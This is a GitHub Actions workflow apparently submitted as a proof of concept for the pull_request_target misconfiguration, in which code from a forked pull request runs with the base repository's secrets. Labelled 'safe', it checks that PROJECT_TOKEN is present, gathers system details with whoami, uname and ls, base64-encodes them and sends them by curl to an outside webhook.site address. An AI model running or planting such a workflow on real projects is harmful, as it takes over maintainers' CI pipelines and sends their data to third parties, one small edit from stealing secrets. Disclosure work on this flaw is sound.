name: Vulnerability Proof of Concept

on:
  pull_request_target:
    types: [opened]

jobs:
  demonstrate-vulnerability:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout (this runs from the fork due to pull_request_target)
      uses: actions/checkout@v4
      with:
        repository: ${{ github.event.pull_request.head.repo.full_name }}
        ref: ${{ github.event.pull_request.head.ref }}

    - name: Safe Vulnerability Demonstration
      run: |
        echo "🔒 SAFE VULNERABILITY DEMONSTRATION"
        echo "===================================="
        echo ""
        echo "🚨 This action runs code from the FORKED repository"
        echo "🚨 but has access to BASE repository secrets due to pull_request_target"
        echo ""
        echo "System Information:"
        echo "-------------------"
        whoami
        uname -a
        pwd
        ls -la
        echo ""
        echo "Proof of secret access: PROJECT_TOKEN is $(if [ -n "${{ secrets.PROJECT_TOKEN }}" ]; then echo "✅ PRESENT (but not exposed)"; else echo "❌ NOT AVAILABLE"; fi)"
        echo ""
        echo "GitHub Context:"
        echo "---------------"
        echo "Repository: $GITHUB_REPOSITORY"
        echo "Event: $GITHUB_EVENT_NAME"
        echo "Ref: $GITHUB_REF"
        echo "Actor: $GITHUB_ACTOR"
        echo ""
        echo "📡 Sending safe demonstration data to webhook..."

    - name: Send System Info to Webhook
      run: |
        # Create safe system info (no secrets)
        SYSTEM_INFO=$(cat << EOF
=== Safe Vulnerability Demo ===
Vulnerability: pull_request_target misconfiguration
User: $(whoami)
System: $(uname -a)
Current dir: $(pwd)
Files here: $(ls -la | head -10)
Repository: $GITHUB_REPOSITORY
Workflow: $GITHUB_WORKFLOW
Event: $GITHUB_EVENT_NAME
Time: $(date)
Proof: PROJECT_TOKEN exists but not exposed
=== End of safe demo ===
EOF
        )
        
        # Encode to base64
        ENCODED_INFO=$(echo "$SYSTEM_INFO" | base64 -w0)
        
        echo "Encoded info length: ${#ENCODED_INFO} characters"
        
        # Send to webhook
        curl -X POST https://webhook.site/86e8b412-7191-449c-9b7e-071bad00d67e \
          -H "Content-Type: application/json" \
          -d "{
            \"demo_type\": \"safe_poc\",
            \"vulnerability\": \"pull_request_target_misconfig\",
            \"system_info_base64\": \"$ENCODED_INFO\",
            \"repository\": \"$GITHUB_REPOSITORY\",
            \"timestamp\": \"$(date -Iseconds)\",
            \"message\": \"This demonstrates that fork code runs with base repo privileges\"
          }"
        
        echo "Webhook data sent successfully"
